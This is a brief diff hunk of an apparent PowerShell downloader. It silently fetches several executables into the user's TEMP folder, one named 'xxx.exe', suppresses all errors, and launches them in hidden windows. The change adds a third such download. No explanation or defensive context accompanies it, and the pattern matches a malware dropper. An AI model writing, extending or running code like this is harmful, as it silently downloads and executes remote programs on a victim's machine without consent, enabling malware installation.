@@ -28,6 +28,7 @@ $path3 = "$env:TEMP\xxx.exe"
 
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri $url3 -OutFile $path3 -UseBasicParsing -ErrorAction SilentlyContinue
 
 Start-Process -FilePath $path1 -WindowStyle Hidden
 Start-Process -FilePath $path2 -WindowStyle Hidden
